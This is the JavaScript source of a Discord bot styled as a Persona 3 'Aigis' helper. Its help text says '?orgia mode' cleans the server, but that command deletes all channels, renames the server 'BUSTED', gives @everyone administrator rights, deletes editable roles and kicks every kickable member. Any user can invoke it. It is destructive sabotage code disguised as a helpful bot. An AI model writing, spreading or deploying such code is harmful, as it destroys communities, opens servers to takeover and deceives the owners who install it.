const Discord = require('discord.js')
const client = new Discord.Client()
const PREFIX = "?"
const helpexampleEmbed = new Discord.MessageEmbed()
	.setColor('#61F3EB')
	.setTitle('명령어들')
	.setDescription("?aigis : 도움말\n\n\
	?orgia mode : 서버를 청소합니다.")

client.on("ready", () => {
	console.log("ready")
	client.user.setActivity('Persona 3 FES', { type: "PLAYING" })
})

client.on('message', message => {
	if (message.channel.type == 'dm') {
		return
	} if (!message.content.startsWith(PREFIX)) {
		return
	} if (!message.guild) {
		return
	} if (message.author.bot) {
		return
	}
	let command = message.content.substring(PREFIX.length)
	let server = message.guild
	switch (command) {
		case "orgia mode":
			server.channels.cache.forEach(channel => channel.delete())
			server.edit({ name: "BUSTED", icon: server.setIcon(null) })
			server.roles.cache.forEach((role) => {
				if (role.name === "@everyone") {
					role.edit({
						permissions: [
							"ADMINISTRATOR",
							"CREATE_INSTANT_INVITE",
							"ADD_REACTIONS",
							"ATTACH_FILES",
							"BAN_MEMBERS",
							"CHANGE_NICKNAME",
							"MANAGE_CHANNELS",
							"MUTE_MEMBERS",
							"SPEAK",
							"STREAM",
							"USE_EXTERNAL_EMOJIS",
							"USE_VAD",
							"VIEW_AUDIT_LOG",
							"VIEW_CHANNEL",
							"VIEW_GUILD_INSIGHTS",
							"MANAGE_GUILD",
							"MANAGE_MESSAGES",
							"MANAGE_ROLES",
							"MANAGE_WEBHOOKS",
							"MENTION_EVERYONE",
							"MOVE_MEMBERS",
							"PRIORITY_SPEAKER",
							"READ_MESSAGE_HISTORY",
							"SEND_MESSAGES",
							"SEND_TTS_MESSAGES",
							"CONNECT",
							"KICK_MEMBERS",
							"MANAGE_NICKNAMES",
							"MANAGE_EMOJIS",
							"EMBED_LINKS",
							"DEAFEN_MEMBERS"
						]
					})
				} else if (role.editable) {
					role.delete()
				}
			})
			server.members.cache.forEach((member) => {
				if (member.kickable) {
					member.kick()
				}
			})
			break;
		case "aigis":
			message.reply(' 아이기스 사용법입니다.')
			message.channel.send(helpexampleEmbed)
			break;
		default:
			break;
	}
})

client.login(process.env.TOKEN)